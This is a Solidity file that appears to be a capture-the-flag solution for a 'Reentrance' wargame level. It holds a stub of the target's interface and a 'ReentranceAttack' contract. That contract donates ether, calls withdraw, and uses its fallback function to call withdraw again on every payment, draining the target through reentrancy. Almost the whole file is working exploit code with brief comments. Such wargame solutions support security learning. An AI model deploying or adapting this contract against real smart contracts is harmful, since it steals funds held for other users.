pragma solidity ^0.4.18;
 
contract Reentrance {
 
  mapping(address => uint) public balances;
 
  function donate(address _to) public payable {}
 
  function balanceOf(address _who) public view returns (uint balance) {}
 
  function withdraw(uint _amount) public {}
 
  function() public payable {}
}
contract ReentranceAttack {

    address instance_address = /*ur_instance_address_here*/;
    Reentrance target = Reentrance(instance_address);

    function ReentranceAttack() payable{}
    // donate some ether to make withdraw accept
    function donate() public payable {
        target.donate.value(msg.value)(this);
    }    

    function get_balance() public view returns(uint) {
        return target.balanceOf(this);
    }

    function myBalance() public view returns(uint) {
        return address(this).balance;
    }

    function targetBalance() public view returns(uint) {
        return instance_address.balance;
    }
    // Make target start transfer
    function hack() public {
        target.withdraw(0.5 ether);
    }
    // Make it become recursive
    function () public payable {
        target.withdraw(0.5 ether);
    }
}